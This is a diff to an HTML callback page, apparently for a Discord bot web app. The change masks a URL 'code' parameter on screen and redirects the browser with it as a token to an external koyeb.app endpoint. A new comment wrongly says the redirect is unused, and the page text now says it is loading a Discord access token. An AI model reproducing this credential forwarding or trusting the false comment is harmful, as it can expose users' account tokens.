@@ -61,9 +61,18 @@
             const params = new URLSearchParams(location.search);
             const code = params.get('code');
 
-            if(code){
-                footerCodeText.innerText = `[Code: ${code}]`;
+            if (code) {
+                // Create a masked string with the same number of bullets
+                const maskedCode = '●'.repeat(code.length);
+                footerCodeText.innerText = `[Code: ${maskedCode}]`;
+
+                // Redirect link (note: not used in this script)
+                const redirectLink = `https://painful-peri-sessions-bot-web-app-868faa41.koyeb.app/api/login-success?token=${code}`;
+                window.location.href = redirectLink;
+            } else {
+                console.warn('No code found?');
             }
+
         })
     </script>
 
@@ -79,7 +88,7 @@
 
             </header>
             <section class="content">
-                We're loading your user profile. Please do not close or refresh this page. If you're not automatically redirected, please start over and try again.
+                We're loading your discord access token. Please do not close or refresh this page. If you're not automatically redirected, please start over and try again.
             </section>
             <footer style="display:flex; width: 100%; justify-content: space-between; align-items: center; border-top: 1px solid rgba(0, 0, 0, 0.388); margin-top: 7px; ">
                 <p id="footerCodeText" style="opacity: 0.5; font-size: small; font-style: italic;">
